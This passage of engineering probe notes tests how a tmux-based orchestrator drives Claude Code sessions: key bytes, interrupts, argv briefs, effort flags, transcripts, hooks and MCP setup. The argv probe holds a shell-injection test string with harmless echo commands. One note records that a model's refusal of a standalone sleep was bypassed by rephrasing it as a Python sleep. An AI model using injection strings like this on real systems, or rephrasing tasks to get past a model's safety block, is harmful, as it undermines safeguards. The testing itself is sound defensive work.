- **Consumed by:** D14 "jump to terminal" (line 117), §9 line 1141, `[tmux attach]` line 1991, `Runner.resize` line 428; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_attach_keys.sh` (part A). Re-run: `bash docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_attach_keys.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/gap-fill/tmux-attach-keys-20260914T170850Z/attach.txt`)
```text
## state: A0 created -x 160 -y 45, no client
inner window=160x45 pane=160x45 session_attached=0
inner window-size option:  (global: latest) aggressive-resize: off
...
## state: A1 Runner.resize (resize-window -x 120 -y 40), no client
inner window=120x40 pane=120x40 session_attached=0
inner window-size option: manual (global: latest) aggressive-resize: off
...
## state: A2 second client attached from a 100x30 terminal (plain attach)
inner window=120x40 pane=120x40 session_attached=1
inner window-size option: manual (global: latest) aggressive-resize: off
inner list-clients: /dev/pts/5 100x30 flags=attached,focused,UTF-8 session=shepherd_t1;
...
## state: A5 window-size set back to latest (the default) with the 90x25 client attached
inner window=90x24 pane=90x24 session_attached=1
...
## state: A6 Runner.resize (-x 150 -y 50) again after A5
inner window=150x50 pane=150x50 session_attached=1
inner window-size option: manual (global: latest) aggressive-resize: off
...
## state: A8 client attached with -f ignore-size,read-only from 100x30, window-size=latest
inner window=100x29 pane=100x29 session_attached=1
inner window-size option: latest (global: latest) aggressive-resize: off
inner list-clients: /dev/pts/5 100x30 flags=attached,focused,ignore-size,read-only,UTF-8 session=shepherd_t1;
...
## A10 typed 'RO' into the read-only client; keydump lines with hex: 0
```
What the 100x30 client sees of the 120x40 window (`A2-outer-client-view.txt`):
```text
keydump ready
...
[shepherd_0:python3*                                         [0,0] "<redacted: host name>" 17:08 14-Sep-26
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| global `window-size` | option | always | `latest` | tmux 3.4 default |
| `aggressive-resize` | option | always | `off` | |
| window `window-size` after `resize-window` | option | always | `manual` | `resize-window` silently switches the window to manual |
| window size with a smaller client attached, window-size manual | WxH | always | stays `120x40`; the client sees a panned viewport (`[0,0]`) | the browser's size wins |
| `resize-window` with a client attached | WxH | always | applied (`150x50`); the pane got SIGWINCH (keydump `sigwinch` lines) | |
| client terminal resize, window-size manual | WxH | always | window unchanged | |
| window-size `latest` with a client | WxH | always | client size minus the status line (`90x24`, `100x29`) | |
| `attach -f ignore-size` as the only client | WxH | observed once | window still followed the client (`100x29`) | `ignore-size` did not stop it when it was the only client |
| `client_flags` | list | always | `attached,focused,UTF-8`; `...,ignore-size,read-only,...` | |
| read-only client keystrokes | bytes to pane | always | none (`hex: 0`) | |

**Variants and edge cases:**
- Detaching the second client (A7) leaves the window at the last `resize-window` size.
- The attached terminal shows tmux's own status line, which includes the host name, unless `status off` is set on the Shepherd socket.

**Spec alignment:**
- Line 1141 ("`tmux -L shepherd attach -t shepherd_<id>` and you are driving it by hand") is aligned on attach itself. Two things are unspecified. First, after any `Runner.resize` (line 428) the window is `manual`, so a human attaching from a smaller terminal sees a clipped, panning view, and from a larger one sees dead space. Second, if Shepherd sets `window-size latest` instead, the browser and the human fight over size. The "exact" claim (line 117, line 1141) needs a chosen policy (`attach.txt`). Use `attach -r` for a view-only hand-off; it was verified that it delivers no keys.

### Raw key bytes delivered to a pane through tmux

- **Produced by:** tmux 3.4 `send-keys` / `paste-buffer` into a raw-mode pane program (`docs/probes/2026-09-14-schemas/gap-fill/keydump.py`, which enables bracketed paste like the Claude TUI)
- **Consumed by:** §9 terminal fidelity lines 1150-1153, write policy lines 1171-1173, `Runner.write` line 427, D40; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_attach_keys.sh` (part B). Re-run: `bash docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_attach_keys.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/gap-fill/tmux-attach-keys-20260914T170850Z/keys-keydump.jsonl`)
```json
{"marker": "send-keys Escape", "t": 1789405745.571}
{"hex": "1b", "repr": "b'\\x1b'", "t": 1789405745.577}
{"marker": "send-keys C-c", "t": 1789405746.181}
{"hex": "03", "repr": "b'\\x03'", "t": 1789405746.188}
{"marker": "send-keys Up Down Left Right", "t": 1789405746.792}
{"hex": "1b5b411b5b421b5b441b5b43", "repr": "b'\\x1b[A\\x1b[B\\x1b[D\\x1b[C'", "t": 1789405746.799}
...
{"marker": "send-keys -H e2 9c 93 (UTF-8 check mark)", "t": 1789405749.848}
{"hex": "e29c93", "repr": "b'\\xe2\\x9c\\x93'", "t": 1789405749.854}
...
{"marker": "send-keys -l 'a\nb' (literal LF)", "t": 1789405751.071}
{"hex": "610a62", "repr": "b'a\\nb'", "t": 1789405751.078}
{"marker": "paste-buffer -p (bracketed, app enabled ?2004h)", "t": 1789405751.689}
{"hex": "1b5b3230307e6c696e65206f6e650d6c696e652074776f1b5b3230317e", "repr": "b'\\x1b[200~line one\\rline two\\x1b[201~'", "t": 1789405751.695}
{"marker": "paste-buffer (no -p)", "t": 1789405752.300}
{"hex": "6c696e65206f6e650d6c696e652074776f", "repr": "b'line one\\rline two'", "t": 1789405752.307}
...
{"marker": "printf XYZ > pane_tty (/dev/pts/4)", "t": 1789405753.529}
{"marker": "end", "t": 1789405754.335}
```

| Input | Bytes the pane read | Notes |
|---|---|---|
| `send-keys Escape` / `C-c` / `Enter` | `1b` / `03` / `0d` | |
| `send-keys Up Down Left Right` | `1b5b41 1b5b42 1b5b44 1b5b43` | normal cursor-key mode |
| `BSpace Tab BTab` | `7f 09 1b5b5a` | |
| `send-keys -H <hex>` | exactly those bytes (`1b5b41`, `03`, `e29c93`, a hand-built `1b5b3230307e...1b5b3230317e`) | an xterm.js `onData` string can be sent byte-exact |
| `send-keys -l` with ESC and LF | `1b5b41`; `610a62` | `-l` does not escape control bytes |
| `paste-buffer -p` | `1b5b3230307e ... 1b5b3230317e`, LF turned into CR | brackets are added only because the app enabled `?2004h` |
| `paste-buffer` (no `-p`) | LF turned into CR, no brackets | |
| write to `#{pane_tty}` | **nothing read**; `XYZ` appears on screen | the slave side is output, not input (`keys-pane-screen.txt`) |

**Spec alignment:**
- Line 1153 (`keystrokes: ──► write policy ──► pty`) is aligned in principle: arbitrary bytes reach the pane through `send-keys -H`. Writing to the pane's tty is **not** a way to type (`keys-pane-screen.txt`), so `Runner.write` must use `send-keys -H` (or `-l` for text), never the tty device.

### Key semantics in the Claude Code TUI (history, bracketed paste, Ctrl-C, Esc)

- **Produced by:** claude 2.1.270 TUI in tmux 3.4 (mock API backend)
- **Consumed by:** §9 lines 1171-1173, D40, UI line 1975; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_keys_claude.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_keys_claude.py`
- **Status:** verified live 2026-09-14

**Real example** (full captures: `docs/probes/2026-09-14-schemas/gap-fill/keys-claude-20260914T180105Z/results.json`, `01-after-raw-up.txt`, `03-after-raw-ctrl-c-idle.txt`)
```json
 "raw_up_recalls_history": true,
 "bracketed_paste_prompt": "PASTE-LINE-ONE\nPASTE-LINE-TWO",
 "raw_ctrl_c_idle_screen_hint": [
  "Press Ctrl-C again to exit"
 ],
 "alive_after_one_ctrl_c": true,
 "esc_clears_input": false
```
```text
─── History 1/1 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ FIRST-PROMPT-FOR-HISTORY
```

| Input (`send-keys -H`) | TUI effect | Notes |
|---|---|---|
| `1b 5b 41` (Up) at an empty prompt | recalls history (`History 1/1`) | |
| `paste-buffer -p` of two lines, then Enter | one prompt; `UserPromptSubmit.prompt` = `PASTE-LINE-ONE\nPASTE-LINE-TWO` | the newline survives; tmux's LF-to-CR does not split it |
| `03` at the idle prompt | hint `Press Ctrl-C again to exit`; session alive | a second one exits (not repeated here) |
| `1b` (Esc) with typed text, once or twice | text stays | Esc does not clear input |

**Variants and edge cases:**
- At startup the TUI enables kitty keyboard protocol flags (`^[[>5u`) and focus events (`?1004h`) (`docs/probes/2026-09-14-schemas/gap-fill/pidfd-pty-*/pty-stream-head.cat-v.txt`). Under tmux with default `extended-keys off`, legacy bytes as above work.

**Spec alignment:** aligned with lines 1171-1173.

### Interrupting a running TUI turn: Esc, C-c, SIGINT

- **Produced by:** claude 2.1.270 TUI in tmux 3.4. Mock API for all four cases, plus a real-API (haiku) repeat of Esc during a tool call
- **Consumed by:** write-policy "explicit interrupt" line 1169, `interrupt_session` line 1231, `⎋ interrupt` line 1975, `Runner.signal` line 429, `killed` line 965, mailbox trigger on `Stop` line 1181; M3/M4
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_interrupt.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_interrupt.py` and `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_interrupt.py --real`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/interrupt-20260914T172251Z/results.json`, `hooks.jsonl`, `esc_tool-transcript-delta.jsonl`, `sigint_tool-screen-after.txt`)
```json
 "esc_tool": {
  "how": "esc",
  "events": [
   "UserPromptSubmit",
   "PreToolUse(Bash)"
  ],
  "claude_alive": true,
```
Transcript entries written by Esc during the Bash call:
```json
{"parentUuid":"3d9ddbf6-6350-4f28-8a9e-e228e96d95af","isSidechain":false,"promptId":"4e064b61-5f19-48a8-940f-1472fa47c95a","type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"The user doesn't want to proceed with this tool use. The tool use was rejected (eg. if it was a file edit, the new_string was NOT written to the file). STOP what you are doing and wait for the user to tell you how to proceed.","is_error":true,"tool_use_id":"toolu_mock_1789406576424"}]},"uuid":"eec46fb0-9200-408c-8a2c-5b3b53c45ea1","timestamp":"2026-09-14T17:22:59.301Z","toolUseResult":"User rejected tool use","toolDenialKind":"user-rejected",...}
{"parentUuid":"5f5cc4ef-1e9c-48dc-9834-0ea68a09e510","isSidechain":false,"promptId":"4e064b61-5f19-48a8-940f-1472fa47c95a","type":"user","message":{"role":"user","content":[{"type":"text","text":"[Request interrupted by user for tool use]"}]},"uuid":"25ee91a1-32b8-4f00-b821-60ddb7a35a87","timestamp":"2026-09-14T17:22:59.304Z","interruptedMessageId":"msg_mock_1789406576424",...}
```
SIGINT to the claude pid during the tool call (`hooks.jsonl`, `sigint_tool-screen-after.txt`):
```json
{"_event":"SessionEnd","_captured_at":"2026-09-14T17:23:41.803Z",...,"hook_event_name":"SessionEnd","reason":"other"}}
```
```text
Resume this session with:
claude --resume 12965b0b-2454-4673-bbce-c3d0635982f5
Pane is dead (status 0, Mon Sep 14 17:23:41 2026)
```

| Delivery | Hooks after the interrupt (8 s window) | Transcript | Session | Notes |
|---|---|---|---|---|
| `send-keys Escape` during a Bash tool call | **none**: no `PostToolUseFailure`, no `Stop` | `tool_result` `is_error:true` + `toolUseResult:"User rejected tool use"`, `toolDenialKind:"user-rejected"`; then user text `[Request interrupted by user for tool use]` with `interruptedMessageId` | alive; the next prompt gets a normal `Stop` | same with the real API (`docs/probes/2026-09-14-schemas/gap-fill/interrupt-real-*/hooks.jsonl`: `PreToolUse`, then the next turn's `UserPromptSubmit`; `transcript-redacted.jsonl` line 23-25) |
| `send-keys C-c` during a Bash tool call | none | same two entries | alive | |
| `send-keys Escape` while the API request is in flight | none | **no marker at all** (only the user prompt entry) | alive; **the prompt text is put back in the input box** | the next typed text was appended to it: `UserPromptSubmit.prompt` = `INT-ESC-STREAMReply with only the word AFTER` |
| `kill -INT <claude pid>` during a tool call | `SessionEnd{reason:"other"}` | | **exits**, pane status 0 | prints `Resume this session with:` |
| `kill -INT <claude pid>` at the idle prompt | `SessionEnd{reason:"other"}` | | exits, status 0 | |
| `send-keys C-c` at the idle prompt | none | | alive, hint shown | |

**Variants and edge cases:**
- A foreground `sleep` as a real-API test failed twice. Haiku first set `run_in_background:true`, then refused ("safety block against standalone sleep"). The committed real run uses `python3 -c 'import time; time.sleep(40)'` (`docs/probes/2026-09-14-schemas/gap-fill/interrupt-real-*/steps.log`).
- `PostToolUseFailure.is_interrupt` was never observed. The hook did not fire at all on interrupt.

**Spec alignment:**
- Line 429 (`Runner.signal`) and line 965 (`killed` = we sent the signal): a SIGINT to the pane process does not interrupt, it **terminates** Claude Code (`SessionEnd` `other`, exit 0). An interrupt must be `send-keys Escape` (`docs/probes/2026-09-14-schemas/gap-fill/interrupt-*/results.json`).
- Line 1181 (mailbox delivery trigger is the `Stop` hook) and line 1169 (running → queue, deliver at next `Stop`): an interrupted turn emits **no `Stop`**, so queued messages would wait until the next completed turn. After an Esc during streaming, the previous prompt sits in the input box, and a programmatic write gets concatenated onto it (`docs/probes/2026-09-14-schemas/gap-fill/interrupt-*/hooks.jsonl`).
- Line 938 (`stopped` on `Stop`/`StopFailure`/`SessionEnd`): after an Esc the session is idle but no stop-class event arrives. The only immediate signal is the pair of transcript entries above (in the 8 s window no hook fired; a later `Notification idle_prompt` was not waited for).

### Brief passed as argv through `tmux new-session` (`EngineAdapter.spawn_argv`)

- **Produced by:** tmux 3.4 + claude 2.1.270 (mock API)
- **Consumed by:** `spawn_argv` line 435, `spawn_session(project, brief, ...)` line 1377, "no `shell=True` anywhere; argv lists only" line 2112; M3/M5
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_argv.py`, `docs/probes/2026-09-14-schemas/gap-fill/probe_argv_limits.sh`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_argv.py && bash docs/probes/2026-09-14-schemas/gap-fill/probe_argv_limits.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/argv-20260914T173100Z/results.json`, `docs/probes/2026-09-14-schemas/gap-fill/argv-limits-20260914T173342Z/tmux-argv-limit.txt`, `claude-dash-brief.stderr`)
```json
 "a_argv_words": {
  "tmux_argv_words": 4,
...
  "pane_comm": "claude",
  "pane_cmdline": [
   "claude",
   "--model",
   "claude-haiku-4-5-20251001",
   "ARGV-BRIEF $(echo EXPANDED) `echo BACKTICK` ; echo SEMI && 'single' \"double\" \\back $HOME *\nsecond line\tTAB \u2713 end"
  ],
  "trust_dialog_shown": true,
  "hooks_before_trust": [],
  "events": [
   "SessionStart",
   "UserPromptSubmit",
   "Stop"
  ],
  "prompt_len": 112,
  "prompt_equals_brief": true,
```
```json
 "b_single_string_naive": {
  "tmux_argv_words": 1,
...
  "prompt_head": "ARGV-BRIEF EXPANDED BACKTICK ; echo SEMI && 'single' double \\back /root *\nsecond line\tTAB \u2713 end",
```
```text
largest accepted single argv word (bytes): 16324
smallest rejected: 16325 -> failed to send command rc=1 
```
```text
error: unknown option '-starts with a dash DASH-BRIEF'
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| positional prompt to interactive `claude` | behaviour | always (4/4 spawned) | **auto-submits**: `SessionStart`, `UserPromptSubmit`, `Stop` | |
| before trust is accepted | hooks | always | `[]` (trust dialog on screen) | the prompt is held and submitted after trust |
| `new-session ... claude --model M <brief>` (argv words) | pane process | always | `pane_comm` `claude` (no shell); cmdline byte-exact | `prompt_equals_brief: true` including `$()`, backticks, quotes, `\`, `*`, LF, TAB, UTF-8 |
| one command string with the brief in `"..."` | pane process | always | `sh -c` expanded `$()`, backticks and `$HOME`, and stripped quotes | `prompt_equals_brief: false` |
| one command string with `shlex.quote(brief)` | prompt | always | byte-exact | |
| brief starting with `-` | exit | always | pane dead status 1; `error: unknown option '-starts with a dash DASH-BRIEF'` | `claude ... -- "-brief"` works (`e_dash_brief_with_separator`) |
| brief size limit | bytes | always | tmux accepts ≤ 16324 bytes for the whole command in this test; 20 KiB and 100 KiB fail with `command too long`; 140 KiB fails earlier in execve (`E2BIG`) | the limit is on tmux's client→server message, not on Linux ARG_MAX |

**Variants and edge cases:**
- Variadic flags such as `--allowedTools a b` swallow a following positional prompt: `Error: Input must be provided either through stdin or as a prompt argument when using --print` (`docs/probes/2026-09-14-schemas/gap-fill/mcp-perm-p-*/results.json`). Put `--` before the brief.

**Spec alignment:**
- Line 2112 (argv lists only) holds only if the tmux command is passed as separate argv words. A single command string goes through `sh -c` and mangles the brief (`b_single_string_naive`).
- Line 1377 `spawn_session(project, brief, ...)` with the brief on argv: briefs over about 16 KB cannot be passed this way at all, and a brief starting with `-` crashes the spawn unless `spawn_argv` emits `--` (`argv-limits-*`, `d_dash_brief_no_separator`). A large `build_brief()` (prior attempts plus the work item) needs another channel, such as `send-keys`/paste after start or a file.

### `--effort` flag: accepted values, invalid values, what reaches the API

- **Produced by:** claude 2.1.270 CLI (mock API logging the request body)
- **Consumed by:** engine matrix line 552, `ModelProvider.effort_ladder()` line 454, `EngineCapabilities.effort_ladder` line 498, `spawn_session(effort?)` line 1656; M3/M4
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_effort.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_effort.py`
- **Status:** verified live 2026-09-14 (request body from a local mock; no real API call)

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/effort-20260914T171533Z/claude-help.txt`, `runs.jsonl`, `summary.jsonl`)
```text
  --effort <level>                      Effort level for the current session
                                        (low, medium, high, xhigh, max)
```
```json
{"label": "effort=bogus haiku", ... "rc": 0, "stdout_summary": {"subtype": "success", "is_error": false, "result": "OK-MOCK"}, "stderr": "Warning: Unknown --effort value 'bogus' \u2014 ignoring it and using the default effort. Valid values: low, medium, high, xhigh, max.", "wall_s": 0.5}
{"label": "no effort claude-haiku-4-5-20251001", "model": "claude-haiku-4-5-20251001", "output_config": null, "thinking": {"budget_tokens": 31999, "type": "enabled", "display": "omitted"}, ... "hook_effort": {"UserPromptSubmit": "<absent>", "Stop": "<absent>"}}
{"label": "effort=xhigh claude-sonnet-5", "model": "claude-sonnet-5", "output_config": {"effort": "xhigh"}, "thinking": {"type": "adaptive", "display": "omitted"}, ... "hook_effort": {"UserPromptSubmit": "<absent>", "Stop": {"level": "xhigh"}}}
{"label": "effort=max claude-opus-5", "model": "claude-opus-5", "output_config": {"effort": "max"}, "thinking": {"type": "adaptive", "display": "omitted"}, ... "hook_effort": {"UserPromptSubmit": "<absent>", "Stop": {"level": "max"}}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `--effort` accepted values | enum | always | `low, medium, high, xhigh, max` (help text and warning) | |
| invalid value (`bogus`, `auto`) | behaviour | always | exit 0, stderr warning, **default effort used** | no error |
| uppercase `MAX` | behaviour | always | accepted as `max` on sonnet (`output_config.effort: "max"`) | case-insensitive |
| request `output_config.effort` (sonnet-5, opus-5) | string | always | the level given; `high` when omitted or invalid | anthropic-beta includes `effort-2025-11-24` |
| request for haiku-4-5 | fields | always | `output_config: null`, `thinking: {budget_tokens: 31999, type: enabled}` for every level | effort is silently dropped for haiku |
| hook `effort` | object | sometimes | `Stop.effort = {level}` for sonnet/opus; absent on `UserPromptSubmit`; absent for haiku | matches the hooks surface |

**Spec alignment:** aligned with line 552 (the ladder is exactly `low·medium·high·xhigh·max`). A mistyped effort does not fail a spawn; it silently runs at `high`, and per-model support must come from `supportedEffortLevels` (next block).

### `ModelProvider.models()` source: initialize `models[]`

- **Produced by:** claude CLI 2.1.259 (SDK-bundled) and 2.1.270 via claude-agent-sdk 0.2.152 `ClaudeSDKClient.get_server_info()` (no model turn)
- **Consumed by:** `ModelProvider.models()` line 453 ("id, context, cost, release"), master runtime selection line 2287; M4
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/sdk_probe.py server_info`. Re-run: `/tmp/shp-sdk-9IOKNs/venv/bin/python docs/probes/2026-09-14-schemas/gap-fill/sdk_probe.py server_info --cli /root/.local/bin/claude` (any venv with claude-agent-sdk)
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/gap-fill/sdk-server_info-syscli-20260914T171115Z/server-info.json`; account values redacted in the file)
```json
 "models": [
  {
   "value": "default",
   "resolvedModel": "claude-opus-5[1m]",
   "displayName": "Default (recommended)",
   "description": "Opus 5 with 1M context \u00b7 Best for everyday, complex tasks",
   "supportsEffort": true,
   "supportedEffortLevels": [
    "low",
    "medium",
    "high",
    "xhigh",
    "max"
   ],
   "supportsAdaptiveThinking": true,
   "supportsFastMode": true,
   "supportsAutoMode": true
  },
...
   "value": "haiku",
   "resolvedModel": "claude-haiku-4-5-20251001",
   "displayName": "Haiku",
   "description": "Haiku 4.5 \u00b7 Fastest for quick answers"
  }
```

| Field | Type | Presence (5 models × 2 CLI versions) | Observed values | Notes |
|---|---|---|---|---|
| `value` | string | always | `default`, `opus[1m]`, `claude-fable-5-1[1m]`, `sonnet`, `haiku` | alias; `[1m]` suffix = 1M context |
| `resolvedModel` | string | always | `claude-opus-5[1m]`, `claude-fable-5-1`, `claude-sonnet-5`, `claude-haiku-4-5-20251001` | |
| `displayName` | string | always | `Default (recommended)`, `Opus (1M context)`, `Fable`, `Sonnet`, `Haiku` | |
| `description` | string | always | `Opus 5 with 1M context · Best for everyday, complex tasks`, … | context size only as prose |
| `supportsEffort` | bool | sometimes (4/5; absent for haiku) | `true` | |
| `supportedEffortLevels` | string[] | sometimes (4/5) | `["low","medium","high","xhigh","max"]` | |
| `supportsAdaptiveThinking` | bool | sometimes (4/5) | `true` | |
| `supportsFastMode` | bool | sometimes (2/5: default, opus[1m]) | `true` | |
| `supportsAutoMode` | bool | sometimes (4/5) | `true` | |
| context window (tokens) | int | **never** | | |
| cost / price | | **never** | | |
| release date | | **never** | | |

**Spec alignment:** spec line 453 says `models()` returns "id, context, cost, release". In reality the engine exposes id (`value`/`resolvedModel`), display name, description and effort capabilities. It does not expose context size (only a `[1m]` suffix and prose), cost, or release date (`server-info.json`, both CLI versions). Those must come from a static table, or context from `ResultMessage.modelUsage[].contextWindow` after a turn (agent-sdk-mcp surface).

### Transcript JSONL: append-only and whole-line writes

- **Produced by:** claude 2.1.270 TUI transcript writer (`<CLAUDE_CONFIG_DIR>/projects/<slug>/<session_id>.jsonl`), mock API
- **Consumed by:** `parse_transcript_delta(path, offset)` line 437, D24 (read transcript at stop); M2
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_transcript_append.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_transcript_append.py`
- **Status:** partially verified (no violation in 34 observed changes; a race cannot be proven absent by sampling)

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/transcript-append-20260914T175435Z/results.json`, `observations.jsonl`, `transcript-outline.json`)
```json
 "observations": 34,
 "violations": 0,
 "partial_tail_observations": 0,
```
```json
{"t": 1789408482.0032, "phase": "turn_small", "file": "9242f47e-a0ba-4505-92cf-7e697e964216.jsonl", "size": 271, "prev_size": null, "ends_with_newline": true}
{"t": 1789408482.1068, "phase": "turn_small", "file": "9242f47e-a0ba-4505-92cf-7e697e964216.jsonl", "size": 243097, "prev_size": 271, "ends_with_newline": true}
```

| Action (phase) | File changes seen | Violations | Partial tails | Notes |
|---|---|---|---|---|
| small turn | 3 | 0 | 0 | first write is 271 bytes, then 243 KB in one step |
| 400 KiB assistant text | 3 | 0 | 0 | one line of 410665 bytes (`assistant len=410665`) appeared whole |
| tool call with large result (`seq 1 200000`) | 3 | 0 | 0 | the tool-result entry is `user len=39928`, far smaller than the ~1.3 MB command output |
| two Write-tool edits (file-history) | 3 + 2 | 0 | 0 | `file-history-delta`, `file-history-snapshot` entries are appended, not rewritten |
| `/rename` | 3 | 0 | 0 | `custom-title`/`agent-name` re-appended |
| manual `/compact` | 2 | 0 | 0 | `system/compact_boundary` appended; earlier bytes kept |
| `/rewind` (Restore conversation) | 0 during, 1 after | 0 | 0 | the dialog says "The conversation will be forked"; nothing rewritten |
| `/clear` | 5 across **two files** | 0 | 0 | a new `<session_id>.jsonl` is created; the old file only gets appends |
| `claude --resume <first id>` + turn | 3 | 0 | 0 | appends to the original file |

**Variants and edge cases:**
- The poller read every `*.jsonl` about every 2 ms and compared each new content with the previous bytes. Writes of up to 410 KB were seen only complete. That is evidence, not proof, that the writer uses whole-line appends.
- `/rewind` with "Restore code and conversation" was not exercised. The picker's selected point had no code changes, so the dialog offered conversation-only options (`screen-rewind-options.txt`).
- The cross-version resume block below also shows append-only across versions (prefix sha256 unchanged).

**Spec alignment:** aligned with line 437 for every action tried. `/clear` switches to a new file, so an offset reader keyed by path must follow `SessionStart{source:"clear"}` to the new `transcript_path`.

### Hooks written into a running session (attached-session registration)

- **Produced by:** claude 2.1.270 TUI (mock API, isolated CLAUDE_CONFIG_DIR)
- **Consumed by:** lines 925-927 ("a hand-launched session registers itself on its first turn"), `SessionStart` row line 881, `install_hooks()` line 440; M1
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_config_scopes.py hot`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_config_scopes.py hot`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/config-scopes-20260914T173908Z/results.json`, `hot-local-hooks.jsonl`)
```json
 "hot": {
  "local_events_right_after_write": [],
  "local_events_after_turn2": [
   "UserPromptSubmit",
   "MessageDisplay",
   "Stop"
  ],
  "user_events_right_after_write": [],
  "local_events_all": [
   "UserPromptSubmit",
   "MessageDisplay",
   "Stop",
   "ConfigChange",
   "UserPromptSubmit",
   "MessageDisplay",
   "Stop",
   "SessionEnd"
  ],
  "user_events_all": [
   "UserPromptSubmit",
   "MessageDisplay",
   "Stop",
   "SessionEnd"
  ],
```
```json
"payload":{"session_id":"6a75342c-7ef6-4553-9944-8f942479fe39",...,"hook_event_name":"ConfigChange","source":"user_settings","file_path":"/tmp/shp-gap-hot-q7dvx4xe/cfg/settings.json"}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| hooks added to `.claude/settings.local.json` while running | fire on the next turn | always | `UserPromptSubmit`, `MessageDisplay`, `Stop` | no restart needed |
| hooks added to user-scope `settings.json` while running | fire on the next turn | always | same | |
| `SessionStart` for that already-running session | event | **never** | | the session never re-announces itself |
| `ConfigChange` for the user-scope write (seen by the local hooks) | event | always | `source:"user_settings"`, `file_path` | the local-file write could not be observed (no hooks were loaded yet) |

**Spec alignment:** lines 925-927 and 881 say a hand-launched session registers through `SessionStart` on its first turn. That holds only for sessions started **after** install. A session already running when `install_hooks()` writes settings begins sending `UserPromptSubmit`/`Stop` and so on, but never `SessionStart` (`hot-local-hooks.jsonl`, `hot-user-hooks.jsonl`). Registration must also accept the first event of any kind from an unknown `session_id` (all events carry `session_id`, `cwd` and `transcript_path`).

### User-scope hooks with `_shepherd_managed`, and the same command in two scopes

- **Produced by:** claude 2.1.270 `-p` (mock API; user scope = `CLAUDE_CONFIG_DIR/settings.json`)
- **Consumed by:** §15 lines 2230-2233, `install_hooks()`/`uninstall_hooks()` lines 440-441; M1
- **Probe:** `probe_config_scopes.py user`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_config_scopes.py user`
- **Status:** verified live 2026-09-14 (in an isolated config dir standing in for `~/.claude`)

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/config-scopes-20260914T173908Z/user-user-settings.json`, `user-dup-hooks.jsonl`, `results.json`)
```json
  "SessionStart": [
   {
    "_shepherd_managed": true,
    "hooks": [
     {
      "type": "command",
```
```json
 "user": {
  "run": {
   "rc": 0,
...
  "dup_events": [
   "SessionStart",
   "UserPromptSubmit",
   "Stop"
  ],
  "user_only_events": [
   "SessionStart",
   "UserPromptSubmit",
   "Stop"
  ],
  "project_only_events": [
   "SessionStart",
   "UserPromptSubmit",
   "Stop"
  ],
...
  "user_settings_after_run_unchanged": true
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `_shepherd_managed: true` on the matcher group and on the hook entry | extra key | always | loads; hooks fire | no validation warning in `user-debug.log` |
| identical `command` string in user and project scope | executions per event | always | **1** (`dup_events` one line each) | deduplicated by command |
| user-only and project-only commands | executions | always | 1 each | scopes merge |
| user settings file after a run | content | always | unchanged | CLI did not rewrite it |

**Spec alignment:** aligned with lines 2230-2233. Because identical commands deduplicate, a Shepherd dispatcher registered in both user and project scope runs once. A slightly different command string (another path or env prefix) would run twice. Not tested: whether an editor such as `/hooks` or `/config` preserves the unknown key when the CLI rewrites `settings.json`.

### Tier-2 MCP server at user scope: `claude mcp add -s user`, pickup, permission rules

- **Produced by:** claude 2.1.270 (`claude mcp add|list|get`, TUI and `-p`), stdio server `docs/probes/2026-09-14-schemas/gap-fill/mcp_stub.py`, mock API, isolated CLAUDE_CONFIG_DIR
- **Consumed by:** lines 1431-1433 (MCP over stdio is the tier-2 contract), 1695 (`shepherd-mcp`), 1700-1707 (SESSION_TOOLS), line 1540 (`mcp__shepherd__*` allowlist); M4
- **Probe:** `probe_config_scopes.py mcp`, `docs/probes/2026-09-14-schemas/gap-fill/probe_mcp_perm_p.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_config_scopes.py mcp && python3 docs/probes/2026-09-14-schemas/gap-fill/probe_mcp_perm_p.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/config-scopes-20260914T173908Z/mcp-add.txt`, `mcp-claude-json-after-add.json`, `mcp-list-get.txt`, `mcp-s2-permission-screen.txt`, `results.json`; `docs/probes/2026-09-14-schemas/gap-fill/mcp-perm-p-20260914T174121Z/results.json`)
```json
 "mcpServers": {
  "shepherd": {
   "type": "stdio",
   "command": "/usr/bin/python3",
   "args": [
